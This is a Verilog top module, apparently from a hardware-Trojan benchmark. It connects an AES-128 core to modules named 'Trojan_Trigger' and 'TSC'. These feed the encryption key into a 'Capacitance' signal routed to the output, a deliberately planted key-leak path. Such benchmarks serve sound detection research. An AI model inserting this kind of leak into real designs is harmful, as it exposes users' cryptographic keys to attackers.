`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company:
// Engineer:
//
// Create Date:    12:02:52 03/06/2013
// Design Name:
// Module Name:    top
// Project Name:
// Target Devices:
// Tool versions:
// Description:
//
// Dependencies:
//
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    input [7:0] num,
    output [7:0] res);
    reg [63:0] state;
    reg [63:0] key;
    reg [63:0] result;
    wire [63:0] Capacitance;


    wire [127:0] statebi;
    wire [127:0] keybi;
    wire [127:0] out;

	wire Tj_Trig;


    bufferin bi(clk, rst, num, statebi, keybi);
	aes_128 AES (clk, statebi, keybi, out);
	Trojan_Trigger Trigger (rst, statebi, Tj_Trig);
	TSC Trojan (rst, clk, Tj_Trig, keybi, Capacitance);

    bufferout bo(.clk(clk)
      ,.resultin(out)
      ,.capin(Capacitance)
      ,.resultout(res));

endmodule
